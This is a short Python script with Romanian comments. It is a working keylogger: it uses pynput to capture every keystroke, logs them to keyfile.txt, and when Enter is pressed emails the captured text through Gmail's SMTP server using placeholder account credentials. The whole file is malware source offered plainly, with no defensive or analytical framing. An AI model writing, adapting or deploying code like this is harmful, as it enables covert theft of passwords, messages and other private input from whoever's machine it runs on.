import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pynput import keyboard

current_text = ""
email_address = "your_email@example.com"  # Adresa de email destinatar
email_password = "your_email_password"  # Parola pentru adresa de email

def send_email(subject, body):
    msg = MIMEMultipart()
    msg['From'] = email_address
    msg['To'] = email_address
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email_address, email_password)
    text = msg.as_string()
    server.sendmail(email_address, email_address, text)
    server.quit()

def clear_and_write_to_file(logKey):
    logKey.seek(0)
    logKey.truncate()
    logKey.write(current_text)

def keyPressed(key):
    global current_text
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            if char:
                logKey.write(char)
                current_text += char
        except AttributeError:
            if key == keyboard.Key.space:
                logKey.write(' ')
                current_text += ' '
            elif key == keyboard.Key.backspace:
                if current_text:
                    current_text_list = current_text.split()
                    if current_text_list:
                        current_text_list.pop()
                        current_text = ' '.join(current_text_list)
                        clear_and_write_to_file(logKey)
            else:
                print("Tasta specială apăsată: {}".format(key))

def on_release(key):
    if key == keyboard.Key.enter:
        with open("keyfile.txt", 'w') as logKey:
            logKey.write("")
        send_email("Date de la tastatură", current_text)
        return False

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed, on_release=on_release)
    listener.start()
    listener.join()